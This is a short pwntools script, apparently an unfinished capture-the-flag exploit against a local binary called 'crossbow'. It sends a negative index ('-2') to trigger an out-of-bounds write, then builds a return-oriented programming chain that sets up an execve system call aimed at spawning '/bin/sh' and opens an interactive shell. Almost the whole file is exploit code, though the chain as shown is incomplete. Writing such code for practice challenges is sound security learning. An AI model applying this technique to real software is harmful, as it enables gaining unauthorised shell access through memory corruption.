from pwn import *

context.binary = './crossbow'

# Trying to setup system(/bin/sh) can get reference to string
rop = ROP(ELF('./crossbow'))
rop.rax = 59
rop.rsi = 0
rop.rdx = 0
print(rop.dump())


payload = b'SAVEDRBP'
payload += rop.chain()

#print(payload)

p = process('./crossbow')
p.recvuntil(b'shoot: ')
p.sendline(b'-2')
p.recvuntil(b'> ')
input(f'{p.pid}')
p.send(payload)
p.interactive()